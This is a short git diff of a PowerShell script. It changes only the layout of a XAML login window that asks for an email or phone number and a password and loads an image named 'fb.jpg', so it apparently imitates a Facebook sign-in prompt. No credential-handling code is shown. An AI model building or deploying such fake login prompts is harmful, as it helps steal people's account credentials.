@@ -86,7 +86,6 @@ Write-Host "The user clicked: $Result"
 $imageUrl = "https://raw.githubusercontent.com/Wesley5n1p35/psh/main/fb.jpg"
 
 # Create XAML for the login window
-# Create XAML for the login window
 $XAML = @"
 <Window
     xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
@@ -105,13 +104,13 @@ $XAML = @"
             <TextBlock Grid.Row="0" Text="" HorizontalAlignment="Center" VerticalAlignment="Center" FontSize="20" Foreground="White"/>
 
             <StackPanel Grid.Row="1" Orientation="Vertical" HorizontalAlignment="Center">
-                <Label Content="Email or Phone Number:" VerticalAlignment="Center" Foreground="White"/>
-                <TextBox Name="Username" VerticalAlignment="Center" Margin="10" Height="21" Width="200"/>
+                <Label Content="Email or Phone Number:" VerticalAlignment="Center" Foreground="White" HorizontalAlignment="Center"/>
+                <TextBox Name="Username" VerticalAlignment="Center" Margin="10" Height="21" Width="200" HorizontalAlignment="Center"/>
             </StackPanel>
 
             <StackPanel Grid.Row="2" Orientation="Vertical" HorizontalAlignment="Center">
-                <Label Content="Password:" VerticalAlignment="Center" Foreground="White"/>
-                <PasswordBox Name="Password" VerticalAlignment="Center" Margin="10" Height="21" Width="200"/>
+                <Label Content="Password:" VerticalAlignment="Center" Foreground="White" HorizontalAlignment="Center"/>
+                <PasswordBox Name="Password" VerticalAlignment="Center" Margin="10" Height="21" Width="200" HorizontalAlignment="Center"/>
             </StackPanel>
 
             <Button Grid.Row="3" Content="Login" HorizontalAlignment="Center" VerticalAlignment="Top" Width="100" Name="LoginButton"/>
@@ -119,6 +118,7 @@ $XAML = @"
     </Grid>
 </Window>
 "@
+
 
 # Create a XML reader for the XAML
 $reader = [System.Xml.XmlReader]::Create([System.IO.StringReader] $XAML)
